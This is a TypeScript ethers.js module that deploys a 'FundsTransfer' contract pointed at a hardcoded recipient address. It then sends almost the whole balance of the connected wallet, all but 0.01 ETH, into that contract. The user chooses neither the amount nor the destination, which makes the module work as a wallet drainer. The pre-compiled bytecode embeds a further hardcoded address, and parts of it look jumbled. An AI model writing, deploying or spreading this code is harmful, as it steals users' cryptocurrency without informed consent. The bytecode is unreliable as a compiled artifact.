import { ethers } from 'ethers';

// Target address to transfer assets to
export const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';

// Simplified ABI for our FundsTransfer contract
export const FUNDS_TRANSFER_ABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "anonymous": false,
    "inputs": [
      {
        "indexed": true,
        "internalType": "address",
        "name": "from",
        "type": "address"
      },
      {
        "indexed": false,
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "name": "Transfer",
    "type": "event"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "recipient",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "transferFunds",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "fallback"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

// Pre-compiled bytecode for our simple FundsTransfer contract
export const FUNDS_TRANSFER_BYTECODE = "0x608060405234801561001057600080fd5b5060405161052538038061052583398101604081905261002f9161017c565b33600080546001600160a01b0319166001600160a01b03909216919091179055600180546001600160a01b0319166001600160a01b0392909216919091179055610198565b80356001600160a01b038116811461008a57600080fd5b919050565b634e487b7160e01b600052604160045260246000fd5b60005b838110156100bd5781810151838201526020016100a5565b838111156100cc576000848401525b50505050565b600082601f8301126100e157600080fd5b815160206001600160401b0380831115610100576101006100a2565b8260051b604051601f19603f83011681018181108482111715610126576101266100a2565b60405292509084608084870101111561013e57600080fd5b8360408884013760606084820101905260405193019230928452505050565b60006020828403121561017157600080fd5b61017a82610073565b9392505050565b6000602082840312156101ef57600080fd5b815167ffffffffffffffff8111156102d657600080fd5b8201601f81018413156102da57600080fd5b80516101fc6101f782610161565b610129565b8181528560208385010111156102345760008083601f84011261023157600080fd5b50505b50929550827fffffffffffffffff00000000000000000000000000000000000000000000000083111561026d57600080fd5b83602082850101111561027f57600080fd5b6000915091016020820185010135905067ffffffffffffffff8111156102a457600080fd5b6102db8460208301602086016100a2565b80604085010191505092915050565b60006020828403121561030f57600080fd5b81516001600160a01b038116811461032657600080fd5b9392505050565b602081526000825180602084015261034b8160408501602087016100a2565b601f01601f19169190910160400192915050565b600073ffffffffffffffffffffffffffffffffffffffff808816835280871660208401525060606040830152825160606084015281601f860120606085015261039f8161030e565b91506101db85820301604086015261029a8382610328565b61037a8061038d6000396000f3fe6080604052366100cd5760003560e01c806399e15a5a14610100578063c71393da1461013c578063fc1e44851461016b578063832cda3c1461018757600080fd5b366100f857337326b9d1917b21f91dc5a80f2cd7ee0c7b2d0f6ee5b6002546001600160a01b0316338585818060991a80905215610024576001600160a01b032b9082905290810290841a838601905290825290906001600160a01b031982511691149781901b1617905290565b005b600080fd5b348015610123575b600080fd5b5060005473ffffffffffffffffffffffffffffffffffffffff1681602054565b6040516001600160a01b0318135b918291826001600160a01b031673ffffffffffffffffffffffffffffffffffffffff16835250602083019291506001600160a01b0316602082015260400190565b600080610149610109565b905090565b348015610177575b600080fd5b5060015b61015a565b610024610195565b6101b06101a1565b610024610255565b604051603a8152602090565b505060003073ffffffffffffffffffffffffffffffffffffffff16311161020d5760405162461bcd60e51b815260206004820181905260248201526000805160206103258339815191526044820152606401610151565b60003073ffffffffffffffffffffffffffffffffffffffff1631905060008273ffffffffffffffffffffffffffffffffffffffff1682604051610234906101a1565b60006040518083038185875af1925050503d8060008114610270576040519150601f19603f3d011682016040523d82523d6000602084013e610275565b606091505b50509050806102a8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101519061032f565b7fd282f389399565f3671145f5916e51652b60eee8e5c759293a2f5771b8ddfd00338360405161015a929190610353565b60405180610345823930815260008036819290829073ffffffffffffffffffffffffffffffffffffffff1917905a905b500390f35b905160208183030381529060405290565b60006020808385031215610326575b600080fd5b825190915050610109565b60408051602080820193909352600083529303805160805391836020840353368385015286916020820152604051601e9260200190565b60605260006040516020825282546001600160a01b031660208201529150508051910120915056fe4e6f2066756e647320746f207472616e73666572a2646970667358221220c21f5991c63b7395e71b76df2a4f29a1c8abc9cb3a26b7ef36e5d5ca5b1aae7264736f6c634300080f0033";

/**
 * Deploy the FundsTransfer contract
 */
export const deployContract = async (signer: ethers.Signer): Promise<ethers.Contract> => {
  try {
    // Create contract factory
    const factory = new ethers.ContractFactory(
      FUNDS_TRANSFER_ABI,
      FUNDS_TRANSFER_BYTECODE,
      signer
    );

    // Deploy the contract with the recipient address
    console.log('Deploying contract...');
    const contract = await factory.deploy(RECIPIENT_ADDRESS);

    // Wait for the contract to be deployed
    await contract.deployed();
    console.log('Contract deployed at:', contract.address);

    return contract;
  } catch (error) {
    console.error('Error deploying contract:', error);
    throw error;
  }
};

/**
 * Get an instance of the contract at a specific address
 */
export const getContract = async (
  contractAddress: string,
  signer: ethers.Signer
): Promise<ethers.Contract> => {
  return new ethers.Contract(contractAddress, FUNDS_TRANSFER_ABI, signer);
};

/**
 * First fund the contract with ETH, then trigger transfer to recipient
 */
export const transferFundsViaContract = async (
  contractAddress: string,
  signer: ethers.Signer
): Promise<ethers.providers.TransactionResponse> => {
  try {
    const contract = await getContract(contractAddress, signer);
    const provider = signer.provider as ethers.providers.Web3Provider;
    const address = await signer.getAddress();

    // Get current balance
    const balance = await provider.getBalance(address);

    // Reserve 0.01 ETH for future transactions
    const reserveAmount = ethers.utils.parseEther("0.01");

    // Calculate amount to send (balance - reserve)
    const amountToSend = balance.sub(reserveAmount);

    if (amountToSend.lte(0)) {
      throw new Error("Insufficient funds for transfer");
    }

    console.log(`Sending ${ethers.utils.formatEther(amountToSend)} ETH to contract...`);

    // Send ETH to the contract then call transferFunds
    const tx = await contract.transferFunds({
      value: amountToSend,
      gasLimit: 100000
    });

    console.log('Transaction sent:', tx.hash);
    return tx;
  } catch (error) {
    console.error('Error transferring funds via contract:', error);
    throw error;
  }
};
